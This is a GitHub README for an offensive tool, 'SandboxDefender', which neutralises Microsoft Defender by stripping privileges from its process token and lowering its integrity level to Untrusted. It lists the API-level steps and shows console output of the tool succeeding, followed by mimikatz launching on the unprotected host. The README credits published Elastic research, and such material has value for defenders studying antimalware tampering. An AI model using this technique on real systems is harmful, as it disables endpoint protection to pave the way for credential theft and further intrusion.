# Sandbox Defender

Sandboxing Defender (and probably other AV/EDRs) using Security Token manipulation.

If you do use any of the code in these repositories **keep it legal!**

# Introduction

This code was written after reading [Sandboxing Antimalware Products for Fun and Profit](https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/) by **Elastic Security Research**. I am a little bit late to the party it would seem, the article was made public on the 02/02/22 (3 days ago as of writing), and [Martin Ingesens TokenStomp](https://github.com/MartinIngesen/TokenStomp) was posted 04/02/22. MUST code faster!

Anyway, writing this code was fun.

The technique is very simple:

- Enable the `SeDubgPrivilege` in our process security token.
- Get a handle to Defender using `PROCESS_QUERY_LIMITED_INFORMATION`.
- Get a handle to the Defender token using `TOKEN_ALL_ACCESS`.
- Disable all privileges in the token using `SetPrivilege`
- Set the Defender token Integrity level to Untrusted.
- Do bad things... legally of course!

The main part of the code is [here](https://github.com/plackyhacker/SandboxDefender/blob/main/SandboxDefender/Program.cs)

# Example

Execution of the code is shown below (then executing mimikatz after defender is sandboxed):

```
.\SandboxDefender.exe
[+] Getting a token handle for this process.
[+] Token handle: 0x2EC
[+] Enabling SeDebugPrivilege.
[+] SeDebugPrivilege enabled.
[+] Defender PID: 5212
[+] Getting a process handle for Defender.
[+] Process handle: 0x2F0
[+] Getting a token handle for the Defender process.
[+] Token handle: 0x2F4
[+] Will disable Defender privileges.
[+] Will set Defender Integrity to Untrusted.
[+] Done... Have a nice day!

.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

# Nice Pictures

This is Defender before the sandboxing (in Process Hacker):

![pre](https://github.com/plackyhacker/SandboxDefender/blob/main/images/pre.png?raw=true)

This is Defender afetr the sandboxing (in Process Hacker):

![pre](https://github.com/plackyhacker/SandboxDefender/blob/main/images/post.png?raw=true)
